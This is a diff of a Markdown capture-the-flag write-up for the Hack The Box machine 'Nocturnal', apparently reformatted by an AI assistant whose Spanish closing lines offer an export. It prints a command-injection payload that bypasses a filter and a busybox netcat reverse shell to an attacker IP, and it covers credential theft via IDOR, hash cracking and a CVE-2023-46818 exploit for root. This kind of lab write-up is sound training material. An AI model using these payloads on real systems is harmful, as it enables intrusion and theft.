@@ -1,186 +1,173 @@
-#htb
-## 🛰️ Reconnaissance
+---
+# HTB - Nocturnal
+
+## Reconnaissance
 
 ### Port Scanning
 
-To begin the assessment, a full TCP SYN scan was conducted across all ports using the following command:
+To begin the assessment, a full TCP SYN scan was performed on all ports to identify open services:
 
 ```bash
 sudo nmap -sS -Pn -n -p- --min-rate 5000 10.10.11.64
-```
+````
 
-![[Pasted image 20250727143751.png]]
+![Port scan](images/20250727143751.png)
 
-Once open ports were identified, a service/version detection scan was executed against the relevant ports:
+Once the open ports were identified, a more detailed service/version scan was launched on ports 22 and 80:
 
 ```bash
 sudo nmap -sCV -Pn -n -p22,80 10.10.11.64
 ```
 
-![[Pasted image 20250727143936.png]]
+![Service detection](images/20250727143936.png)
 
-The scan revealed the hostname `http://nocturnal.htb`. The hostname was added to the `/etc/hosts` file for name resolution:
+The scan revealed the virtual host `http://nocturnal.htb`. This was added to the local `/etc/hosts` file to resolve the hostname properly:
 
-![[Pasted image 20250727144211.png]]
+![Hosts entry](images/20250727144211.png)
 
----
+## Web Exploration
 
-## 🌐 Web Exploration
+Upon accessing the domain:
 
-Accessing the domain:
+![Main page](images/20250727144235.png)
 
-![[Pasted image 20250727144235.png]]
+A test user named `test` was created through the registration form:
 
-A test user account was created:
+![Test user creation](images/20250727144334.png)
 
-![[Pasted image 20250727144334.png]]
+The file upload feature allowed only files with the following extensions: `.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.odt`.
 
-The upload functionality accepted the following file extensions: `.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.odt`.
+![Upload restrictions](images/20250727144655.png)
 
-![[Pasted image 20250727144655.png]]
+Analyzing the URLs generated after uploading files revealed that it was possible to manipulate the `username` and `file` parameters to access files uploaded by other users.
 
-By analyzing the request structure and upload behavior, it was possible to manipulate the `username` and `file` parameters to access files uploaded by other users:
+![Path traversal test](images/20250727145006.png)
 
-![[Pasted image 20250727145006.png]]
+## Enumeration & File Discovery
 
----
+A brute-force attack was initiated to enumerate valid usernames and filenames stored on the server:
 
-## 🔍 Enumeration & File Discovery
+![Brute-force attack](images/20250727152938.png)
 
-A brute-force attack was launched to discover possible users and filenames:
+The attack revealed:
 
-![[Pasted image 20250727152938.png]]
+* **Username:** `amanda`
+* **File:** `privacy.odt`
 
-Discovered:
+![File found](images/20250727153012.png)
 
-- **Username:** `amanda`
-    
-- **File:** `privacy.odt`
-    
-
-![[Pasted image 20250727153012.png]]
-
-The file was accessed and downloaded using:
+The file was accessed directly from:
 
 ```
 http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
 ```
 
-![[Pasted image 20250727153131.png]]
+![File download](images/20250727153131.png)
 
-Upon inspection, the file revealed Amanda’s credentials:
+The document contained Amanda’s credentials:
 
-![[Pasted image 20250727153219.png]]
+![Credentials found](images/20250727153219.png)
 
-With these credentials, access to an admin panel was granted:
+Using these credentials, access was gained to an administrative panel:
 
-![[Pasted image 20250727153308.png]]
+![Admin panel](images/20250727153308.png)
 
----
+## Vulnerability in Admin Panel
 
-## ⚠️ Vulnerability in Admin Panel
+Analyzing the source code of `admin.php` revealed a vulnerable **backup generation** feature:
 
-Reviewing `admin.php` exposed a vulnerable **backup feature**:
+![Vulnerable code](images/20250727153329.png)
 
-![[Pasted image 20250727153329.png]]
+### Vulnerability Summary
 
-### Vulnerability Summary:
+* Admins could create ZIP backups of the directory, protected by a password.
+* The password field was passed directly into the `zip` shell command via `proc_open()`.
+* The `cleanEntry()` function was used for input sanitization but only blacklisted certain characters (`;`, `&`, `|`, `$`, etc.).
+* There was no proper escaping or whitelisting of input.
 
-- Admins could generate ZIP backups of the directory, protected by a user-supplied password.
-    
-- The password was passed to the `zip` command inside a `proc_open()` shell call.
-    
-- Input sanitization via `cleanEntry()` was weak, blacklisting characters like `;`, `&`, `|`, `$`, spaces, etc.
-    
-- No robust escaping or whitelisting was applied.
-    
-
-To test for command injection, I intercepted the POST request and modified the `password` parameter as follows:
+A test for command injection was performed by intercepting and modifying the POST request:
 
 ```http
 POST /admin.php HTTP/1.1
 Host: nocturnal.htb
-...
 Content-Type: application/x-www-form-urlencoded
-...
 
 password=%0abash%09-c%09"whoami"&backup=
 ```
 
-**Explanation of payload:**
+Explanation:
 
-- `%0a` — newline to terminate previous input
-    
-- `%09` — URL-encoded tab
-    
-- `bash -c "whoami"` — executes command
-    
+* `%0a`: newline (terminates input)
+* `%09`: tab (used to bypass space filtering)
+* `bash -c "whoami"`: executes command
 
-![](https://miro.medium.com/v2/resize:fit:700/1*v9oRPOPOuTWfR2fwdcHlHQ.png)
+![Command injection test](images/20250727153329.png)
 
----
+## Reverse Shell
 
-## 🐚 Reverse Shell
-
-Once command injection was confirmed, a reverse shell was executed using BusyBox netcat:
+After confirming command execution, a reverse shell was triggered using `busybox` with netcat:
 
 ```bash
 password=%0abash%09-c%09"busybox%09nc%0910.10.14.20%094444%09-e%09/bin/bash”&backup=
 ```
 
-![](https://miro.medium.com/v2/resize:fit:388/1*GEcOas5C_hPieT-HceJgtQ.png)
+![Reverse shell sent](images/rev_shell_payload.png)
 
-Listener on attack machine:
+A listener was opened on the attacker's machine:
 
-![[Pasted image 20250727143254.png]]
+![Listener](images/20250727143254.png)
 
-A shell was obtained, and SQLite was used to dump the user hashes from the internal database. The flag user was **tobias**:
+Once inside the shell, the SQLite database was queried, revealing user accounts and password hashes. The user containing the flag was `tobias`.
 
-![[Pasted image 20250727143507.png]]
+![SQLite dump](images/20250727143507.png)
 
-The password hash was cracked using [https://hashes.com](https://hashes.com/).
+The hash was cracked using [hashes.com](https://hashes.com):
 
-![[Pasted image 20250727143326.png]]
+![Hash cracked](images/20250727143326.png)
 
-SSH access was achieved with Tobias’s credentials:
+Using the recovered credentials, SSH access was gained:
 
-![[Pasted image 20250727153703.png]]
+```bash
+ssh tobias@nocturnal.htb
+```
 
----
+![SSH access](images/20250727153703.png)
 
-## 🔁 Pivoting: Accessing Internal Services
+## Pivoting: Accessing Internal Services
 
-During local enumeration, an internal service was discovered on port **8080**. To access it, an SSH tunnel was created:
+During local enumeration, an internal service was discovered on port `8080`. This service was not accessible externally, so SSH port forwarding was used:
 
 ```bash
 ssh -L 8081:127.0.0.1:8080 tobias@nocturnal.htb
 ```
 
-![](https://miro.medium.com/v2/resize:fit:700/1*rE930kDY1XVJl9wmgZ6ErA.png)
+![Port forwarding](images/port_forwarding.png)
 
-The forwarded port revealed an **ISPConfig** interface:
+The web interface of ISPConfig was exposed at `http://127.0.0.1:8081`. Default credentials were tested and successful:
 
-- **Username:** admin
-    
-- **Password:** slowmotionapocalypse
-    
+* **Username:** admin
+* **Password:** slowmotionapocalypse
 
-![](https://miro.medium.com/v2/resize:fit:361/1*8EfRE_MuT-yDx7WsCSFRcA.png)
+![ISPConfig login](images/ispconfig_login.png)
 
----
+## Remote Code Execution (RCE)
 
-## 🚨 Remote Code Execution (RCE)
+ISPConfig was running a version affected by the critical vulnerability:
 
-ISPConfig was running a version vulnerable to:
+> **CVE-2023-46818** – Remote Code Execution
 
-> **CVE-2023-46818** — Remote Code Execution
+A public exploit was found and executed:
 
-A public exploit was retrieved from GitHub:
+* [https://github.com/engranaabubakar/CVE-2023-46818](https://github.com/engranaabubakar/CVE-2023-46818)
 
-🔗 [https://github.com/engranaabubakar/CVE-2023-46818](https://github.com/engranaabubakar/CVE-2023-46818)
+The exploit granted **root** access to the server, successfully completing the CTF challenge.
 
-The exploit successfully escalated privileges to **root**, completing the challenge.
-
-![](https://miro.medium.com/v2/resize:fit:700/1*3UbdM_Teou82L1XZcnoYPA.png)
+![Root access](images/root_access.png)
 
 ---
+
+- Asegúrate de que todas las imágenes estén correctamente renombradas y almacenadas en la carpeta `images/` dentro del mismo directorio que el `.md`.
+- Si necesitas que genere también un `.pdf` o `.html` a partir del `.md`, puedo ayudarte con el comando de `pandoc` o `typora`.
+
+¿Quieres que te lo exporte como `.pdf` o `.html` también?
+```
